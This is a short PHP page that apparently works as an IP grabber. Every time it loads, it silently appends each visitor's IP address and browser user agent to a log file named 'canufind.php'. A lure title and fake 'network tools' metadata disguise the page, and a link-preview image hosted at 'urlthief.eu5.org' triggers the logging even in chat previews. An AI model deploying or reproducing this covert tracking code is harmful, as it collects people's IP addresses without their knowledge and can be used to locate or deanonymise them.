<?php 
date_default_timezone_set('Europe/Istanbul');
$dosya = fopen("canufind.php" , 'a');
$useragent = $_SERVER ['HTTP_USER_AGENT'];
fwrite($dosya , date('[d/m/Y-H.i.s]') . " " .getenv("REMOTE_ADDR")." -> ". $useragent. PHP_EOL);
fclose($dosya);
if(isset($_GET['image'])){
	$file = "./MvEGaQ.png";
	$type = 'image/png';
	header('Content-Type:'. $type);
	header('Content-Length: ' . filesize($file));
	readfile($file);
	exit();
}
?>
<html>
<head>

	<title> sexylayd <?php echo rand(1,9999);?></title>
	<meta name="description" content="Ultimate network araçları" />
	<meta name="keywords" content="ip adresim, hız ölçme, kabe yönü, açık portlar" />
	<meta property="og:image" content="http://urlthief.eu5.org/a/v2/index.php?image=<?php echo rand(1,9999);?>"/>
</head>
<body>
</body>
</html>